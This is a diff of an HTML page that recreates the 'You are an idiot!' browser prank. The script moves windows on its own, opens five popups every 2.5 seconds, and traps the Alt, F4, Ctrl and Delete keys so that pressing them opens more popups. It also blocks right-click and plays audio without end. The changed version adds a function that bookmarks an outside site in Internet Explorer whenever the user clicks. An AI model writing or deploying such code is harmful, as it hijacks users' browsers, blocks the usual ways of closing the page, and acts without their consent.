@@ -4,70 +4,82 @@
     <title>You are an idiot!</title>
     <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
 </head>
-<body bgcolor="#ffffff" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0" onload="startChaos()">
+<body bgcolor="#ffffff" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0" onclick="addBookmark()">
     
-    <!-- The All-Important Images: Uses only one image for now -->
+    <!-- Forced 4:3 aspect ratio by resizing the image itself -->
     <div align="center">
-        <img id="theImg" src="flash.gif" alt="You are an idiot!" width="100%" height="100%">
+        <img src="flashl.gif" alt="You are an idiot!" width="640" height="480">
     </div>
 
-    <!-- Audio: The only thing IE4/IE5 understands for background audio -->
-    <bgsound id="bgAudio" src="idiot.mp3" loop="infinite">
+    <bgsound src="idiotl.mp3" loop="infinite">
 
     <script language="Javascript">
-    var flagRun = 1;
-    var xOff = 5;
-    var yOff = 5;
-    var xPos = 400;
-    var yPos = -100;
-
-    function playBall() {
-        if (flagRun != 1) return;
-        xPos += xOff;
-        yPos += yOff;
-        if (xPos > screen.width - 357) xOff = Math.ceil(-6 * Math.random()) * 5 - 10;
-        if (xPos < 0) xOff = Math.ceil(7 * Math.random()) * 5 - 10;
-        if (yPos > screen.height - 330) yOff = Math.ceil(-6 * Math.random()) * 5 - 10;
-        if (yPos < 0) yOff = Math.ceil(7 * Math.random()) * 5 - 10;
-        window.moveTo(xPos, yPos);
-        setTimeout("playBall()", 1);
-    }
-
-    function openWindow(url) {
-        window.open(url, "_blank", "menubar=no,status=no,toolbar=no,resizable=no,width=357,height=330,titlebar=no,alwaysRaised=yes");
-    }
-
-    function procreate() {
-        for (var i = 0; i < 5; i++) {
-            openWindow('lol.html');
+        // --- IE4/5 safe named functions ---
+        function blockRightClick() {
+            return false;
         }
-    }
 
-    function startChaos() {
-        document.title = "You are an idiot!";
-        playBall();
-        procreate();
-        setInterval("procreate()", 2500);
-    }
+        // --- Auto-Bookmark the site (whenever they click anywhere) ---
+        function addBookmark() {
+            if (navigator.appName == "Microsoft Internet Explorer" && parseInt(navigator.appVersion) >= 4) {
+                window.external.AddFavorite("https://yaai.adngsnews.site/legacy.html", "You are an idiot!");
+            }
+        }
 
-    // IE4/5 compatible named function
-    function keyTrap() {
-        if (event.keyCode == 18 || event.keyCode == 115) {
-            alert("You are an idiot!");
+        var flagRun = 1;
+        var xOff = 5;
+        var yOff = 5;
+        var xPos = 400;
+        var yPos = -100;
+
+        function playBall() {
+            if (flagRun != 1) return;
+            xPos += xOff;
+            yPos += yOff;
+            if (xPos > screen.width - 357) xOff = Math.ceil(-6 * Math.random()) * 5 - 10;
+            if (xPos < 0) xOff = Math.ceil(7 * Math.random()) * 5 - 10;
+            if (yPos > screen.height - 330) yOff = Math.ceil(-6 * Math.random()) * 5 - 10;
+            if (yPos < 0) yOff = Math.ceil(7 * Math.random()) * 5 - 10;
+            window.moveTo(xPos, yPos);
+            setTimeout("playBall()", 1);
+        }
+
+        function openWindow(url) {
+            window.open(url, "_blank", "menubar=no,status=no,toolbar=no,resizable=no,width=357,height=330,titlebar=no,alwaysRaised=yes");
+        }
+
+        // --- Uses loll.html now ---
+        function procreate() {
+            for (var i = 0; i < 5; i++) {
+                openWindow('loll.html');
+            }
+        }
+
+        function startChaos() {
+            document.title = "You are an idiot!";
+            playBall();
             procreate();
+            setInterval("procreate()", 2500);
         }
-        if (event.keyCode == 17) {
-            alert("You are an idiot!");
-            procreate();
-        }
-        if (event.keyCode == 46) {
-            alert("You are an idiot!");
-            procreate();
-        }
-    }
 
-    document.onkeydown = keyTrap;
-    document.oncontextmenu = function() { return false; };
-</script>
+        // Named function for keyboard traps
+        function keyTrap() {
+            if (event.keyCode == 18 || event.keyCode == 115) {
+                alert("You are an idiot!");
+                procreate();
+            }
+            if (event.keyCode == 17) {
+                alert("You are an idiot!");
+                procreate();
+            }
+            if (event.keyCode == 46) {
+                alert("You are an idiot!");
+                procreate();
+            }
+        }
+
+        document.onkeydown = keyTrap;
+        document.oncontextmenu = blockRightClick;
+    </script>
 </body>
 </html>
